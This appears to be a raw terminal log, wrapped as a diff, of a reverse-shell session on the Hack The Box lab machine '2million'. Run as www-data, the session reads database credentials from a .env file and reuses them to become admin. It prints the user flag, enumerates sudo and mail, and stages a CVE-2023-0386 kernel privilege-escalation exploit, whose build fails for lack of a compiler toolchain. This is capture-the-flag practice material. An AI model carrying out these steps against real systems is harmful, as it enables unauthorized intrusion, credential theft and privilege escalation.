@@ -1,0 +1,245 @@
+Listening on 0.0.0.0 9003
+Connection received on 10.129.229.66 56848
+bash: cannot set terminal process group (1093): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ <stname; ls -la /var/www/html | head -20; echo MARK1
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+2million
+total 56
+drwxr-xr-x 10 root root 4096 Nov 18 21:20 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Nov 18 21:20 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+MARK1
+www-data@2million:~/html$ <cho ---; cat /var/www/html/Database.php; echo MARK2
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+---
+<?php
+
+class Database 
+{
+    private $host;
+    private $user;
+    private $pass;
+    private $dbName;
+
+    private static $database = null;
+    
+    private $mysql;
+
+    public function __construct($host, $user, $pass, $dbName)
+    {
+        $this->host     = $host;
+        $this->user     = $user;
+        $this->pass     = $pass;
+        $this->dbName   = $dbName;
+
+        self::$database = $this;
+    }
+
+    public static function getDatabase(): Database
+    {
+        return self::$database;
+    }
+
+    public function connect()
+    {
+        $this->mysql = new mysqli($this->host, $this->user, $this->pass, $this->dbName);
+    }
+
+    public function query($query, $params = [], $return = true)
+    {
+        $types = "";
+        $finalParams = [];
+
+        foreach ($params as $key => $value)
+        {
+            $types .= str_repeat($key, count($value));
+            $finalParams = array_merge($finalParams, $value);
+        }
+
+        $stmt = $this->mysql->prepare($query);
+        $stmt->bind_param($types, ...$finalParams);
+
+        if (!$stmt->execute())
+        {
+            return false;
+        }
+
+        if (!$return)
+        {
+            return true;
+        }
+
+        return $stmt->get_result() ?? false;
+    }
+}MARK2
+www-data@2million:~/html$ < admin -c "id; ls -la /home/admin" 2>&1; echo MARK3
+Password: uid=1000(admin) gid=1000(admin) groups=1000(admin)
+total 32
+drwxr-xr-x 4 admin admin 4096 Jun  6  2023 .
+drwxr-xr-x 3 root  root  4096 Jun  6  2023 ..
+lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
+-rw-r--r-- 1 admin admin 3771 May 26  2023 .bashrc
+drwx------ 2 admin admin 4096 Jun  6  2023 .cache
+-rw-r--r-- 1 admin admin  807 May 26  2023 .profile
+drwx------ 2 admin admin 4096 Jun  6  2023 .ssh
+-rw-r----- 1 root  admin   33 Nov 18 21:07 user.txt
+MARK3
+www-data@2million:~/html$ < -c "cat /home/admin/user.txt; id" 2>&1; echo MARK4
+Password: aecfed32bbb3055fdbf97ef0d6bf39ba
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+MARK4
+www-data@2million:~/html$ <.ssh; cat ~/.ssh/id_* 2>/dev/null" 2>&1; echo MARK5
+Password: sudo: a password is required
+total 8
+drwx------ 2 admin admin 4096 Jun  6  2023 .
+drwxr-xr-x 4 admin admin 4096 Jun  6  2023 ..
+MARK5
+www-data@2million:~/html$ <ss123 | sudo -S -l 2>&1 | tail -8" 2>&1; echo MARK6
+Password: [sudo] password for admin: Sorry, user admin may not run sudo on localhost.
+MARK6
+www-data@2million:~/html$ <l/bin /usr/local/sbin 2>/dev/null" 2>&1; echo MARK7
+Password: total 12
+drwxrwsr-x  2 root  mail  4096 Jun  2  2023 .
+drwxr-xr-x 14 root  root  4096 Jun  6  2023 ..
+-rw-r--r--  1 admin admin  540 Jun  2  2023 admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+/opt:
+
+/usr/local/bin:
+
+/usr/local/sbin:
+laurel
+unminimize
+MARK7
+www-data@2million:~/html$ <ke cc; ls -la /usr/bin/gcc* 2>/dev/null; echo MARK8
+5.15.70-051570-generic
+/usr/bin/gcc
+/usr/bin/make
+/usr/bin/cc
+lrwxrwxrwx 1 root root  6 Aug  5  2021 /usr/bin/gcc -> gcc-11
+lrwxrwxrwx 1 root root 23 Jan 16  2023 /usr/bin/gcc-11 -> x86_64-linux-gnu-gcc-11
+lrwxrwxrwx 1 root root  9 Aug  5  2021 /usr/bin/gcc-ar -> gcc-ar-11
+lrwxrwxrwx 1 root root 26 Jan 16  2023 /usr/bin/gcc-ar-11 -> x86_64-linux-gnu-gcc-ar-11
+lrwxrwxrwx 1 root root  9 Aug  5  2021 /usr/bin/gcc-nm -> gcc-nm-11
+lrwxrwxrwx 1 root root 26 Jan 16  2023 /usr/bin/gcc-nm-11 -> x86_64-linux-gnu-gcc-nm-11
+lrwxrwxrwx 1 root root 13 Aug  5  2021 /usr/bin/gcc-ranlib -> gcc-ranlib-11
+lrwxrwxrwx 1 root root 30 Jan 16  2023 /usr/bin/gcc-ranlib-11 -> x86_64-linux-gnu-gcc-ranlib-11
+MARK8
+www-data@2million:~/html$ < echo ---; gcc --version 2>&1 | head -1; echo MARK9
+5.15.70-051570-generic
+---
+gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0
+MARK9
+www-data@2million:~/html$ <00/CVE-2023-0386-main/$f; done; ls -la; echo MARK10
+total 28
+drwxr-xr-x  2 www-data www-data 4096 Nov 18 21:31 .
+drwxrwxrwt 15 root     root     4096 Nov 18 21:31 ..
+-rw-r--r--  1 www-data www-data  150 Nov 18 21:31 Makefile
+-rw-r--r--  1 www-data www-data 3093 Nov 18 21:31 exp.c
+-rw-r--r--  1 www-data www-data 5616 Nov 18 21:31 fuse.c
+-rw-r--r--  1 www-data www-data  549 Nov 18 21:31 getshell.c
+MARK10
+www-data@2million:/tmp/cve$ cd /tmp/cve && make 2>&1; ls -la; echo MARK11
+gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+make: gcc: No such file or directory
+make: *** [Makefile:2: all] Error 127
+total 28
+drwxr-xr-x  2 www-data www-data 4096 Nov 18 21:31 .
+drwxrwxrwt 15 root     root     4096 Nov 18 21:31 ..
+-rw-r--r--  1 www-data www-data  150 Nov 18 21:31 Makefile
+-rw-r--r--  1 www-data www-data 3093 Nov 18 21:31 exp.c
+-rw-r--r--  1 www-data www-data 5616 Nov 18 21:31 fuse.c
+-rw-r--r--  1 www-data www-data  549 Nov 18 21:31 getshell.c
+MARK11
+www-data@2million:/tmp/cve$ </bin/x86_64-linux-gnu-gcc* 2>&1 | head; echo MARK12
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+/usr/bin/gcc
+gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0
+lrwxrwxrwx 1 root root      6 Aug  5  2021 /usr/bin/gcc -> gcc-11
+lrwxrwxrwx 1 root root      6 Aug  5  2021 /usr/bin/x86_64-linux-gnu-gcc -> gcc-11
+-rwxr-xr-x 1 root root 862976 Jan 16  2023 /usr/bin/x86_64-linux-gnu-gcc-11
+lrwxrwxrwx 1 root root      9 Aug  5  2021 /usr/bin/x86_64-linux-gnu-gcc-ar -> gcc-ar-11
+-rwxr-xr-x 1 root root  27176 Jan 16  2023 /usr/bin/x86_64-linux-gnu-gcc-ar-11
+lrwxrwxrwx 1 root root      9 Aug  5  2021 /usr/bin/x86_64-linux-gnu-gcc-nm -> gcc-nm-11
+-rwxr-xr-x 1 root root  27176 Jan 16  2023 /usr/bin/x86_64-linux-gnu-gcc-nm-11
+lrwxrwxrwx 1 root root     13 Aug  5  2021 /usr/bin/x86_64-linux-gnu-gcc-ranlib -> gcc-ranlib-11
+-rwxr-xr-x 1 root root  27176 Jan 16  2023 /usr/bin/x86_64-linux-gnu-gcc-ranlib-11
+MARK12
+www-data@2million:/tmp/cve$ <>&1 | head -3; ls -la fuse exp gc 2>&1; echo MARK13
+fuse.c: In function 'read_buf_callback':
+fuse.c:106:21: warning: format '%d' expects argument of type 'int', but argument 2 has type 'off_t' {aka 'long int'} [-Wformat=]
+  106 |     printf("offset %d\n", off);
+      |                    ~^     ~~~
+      |                     |     |
+collect2: fatal error: cannot find 'ld'
+compilation terminated.
+collect2: fatal error: cannot find 'ld'
+compilation terminated.
+ls: cannot access 'fuse': No such file or directory
+ls: cannot access 'exp': No such file or directory
+ls: cannot access 'gc': No such file or directory
+MARK13
+www-data@2million:/tmp/cve$ <d.* /usr/bin/x86_64-linux-gnu-ld* 2>&1; echo MARK14
+lrwxrwxrwx 1 root root      19 May 22  2023 /usr/bin/ld -> x86_64-linux-gnu-ld
+lrwxrwxrwx 1 root root      23 May 22  2023 /usr/bin/ld.bfd -> x86_64-linux-gnu-ld.bfd
+lrwxrwxrwx 1 root root      24 May 22  2023 /usr/bin/ld.gold -> x86_64-linux-gnu-ld.gold
+lrwxrwxrwx 1 root root      23 May 22  2023 /usr/bin/x86_64-linux-gnu-ld -> x86_64-linux-gnu-ld.bfd
+-rwxr-xr-x 1 root root 1744376 May 22  2023 /usr/bin/x86_64-linux-gnu-ld.bfd
+-rwxr-xr-x 1 root root 3189920 May 22  2023 /usr/bin/x86_64-linux-gnu-ld.gold
+MARK14
+www-data@2million:/tmp/cve$ <p/t 2>&1 | head -3; ls -la /tmp/t 2>&1; echo MARK15
+GNU ld (GNU Binutils for Ubuntu) 2.38
+gcc: fatal error: cannot execute 'cc1': execvp: No such file or directory
+compilation terminated.
+ls: cannot access '/tmp/t': No such file or directory
+MARK15
+www-data@2million:/tmp/cve$ <1 | head; ls -la /usr/libexec/gcc 2>&1; echo MARK16
+total 12
+drwxr-xr-x 3 root root 4096 Jun  6  2023 .
+drwxr-xr-x 3 root root 4096 Jun  6  2023 ..
+drwxr-xr-x 4 root root 4096 Jun  6  2023 11
+cc1
+collect2
+crtbegin.o
+crtbeginS.o
+crtbeginT.o
+crtend.o
+crtendS.o
+crtfastmath.o
+crtoffloadbegin.o
+crtoffloadend.o
+ls: cannot access '/usr/libexec/gcc': No such file or directory
+MARK16
+www-data@2million:/tmp/cve$ <ux-gnu/11/cc1 --version 2>&1 | head -2; echo MARK17
+-rwxr-xr-x 1 root root 25944768 Jan 16  2023 /usr/lib/gcc/x86_64-linux-gnu/11/cc1
+-rwxr-xr-x 1 root root   299048 Jan 16  2023 /usr/lib/gcc/x86_64-linux-gnu/11/collect2
+MARK17
+www-data@2million:/tmp/cve$ 
